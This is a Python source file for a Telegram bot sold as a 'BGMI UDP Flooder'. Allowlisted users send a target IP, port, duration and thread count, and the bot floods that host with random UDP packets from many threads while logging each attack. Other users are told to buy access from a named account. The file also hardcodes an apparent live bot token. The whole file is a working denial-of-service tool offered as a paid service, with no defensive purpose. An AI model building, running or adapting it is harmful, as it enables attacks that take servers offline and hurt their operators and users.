import telebot
import threading
import socket
import random
import datetime
import os
from keep_alive import keep_alive

keep_alive()

bot = telebot.TeleBot('8003367791:AAFLHfY5NYK6_kHtMvsVVupccPrIc75pIkg')  # Replace with your real token

admin_id = ["8003367791"]
USER_FILE = "users.txt"
LOG_FILE = "log.txt"
allowed_user_ids = []

# Read users from file
def read_users():
    try:
        with open(USER_FILE, "r") as f:
            return f.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Log attack
def log_command(user_id, target, port, time):
    with open(LOG_FILE, "a") as f:
        f.write(f"UserID: {user_id} | Target: {target} | Port: {port} | Time: {time} | Date: {datetime.datetime.now()}\n")

# UDP Flood Function
def udp_flood(ip, port, duration, thread_id):
    timeout = datetime.datetime.now() + datetime.timedelta(seconds=duration)
    packet = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while datetime.datetime.now() < timeout:
        try:
            sock.sendto(packet, (ip, port))
        except:
            pass

# Handle /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        command = message.text.split()
        if len(command) == 5:
            target = command[1]
            port = int(command[2])
            duration = int(command[3])
            threads = int(command[4])

            if duration > 600:
                bot.reply_to(message, "⛔ Max duration is 600 seconds")
                return

            log_command(user_id, target, port, duration)
            bot.reply_to(message, f"🚀 Attack started on {target}:{port} for {duration}s with {threads} threads")

            for i in range(threads):
                t = threading.Thread(target=udp_flood, args=(target, port, duration, i))
                t.daemon = True
                t.start()
        else:
            bot.reply_to(message, "Usage: /bgmi <IP> <PORT> <TIME> <THREADS>")
    else:
        bot.reply_to(message, "🚫 Unauthorized user. DM @SHxMODS to buy access.")

@bot.message_handler(commands=['start'])
def welcome(message):
    bot.reply_to(message, "👋 Welcome to BGMI UDP Flooder Bot. Use /bgmi <ip> <port> <time> <threads> to start")

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")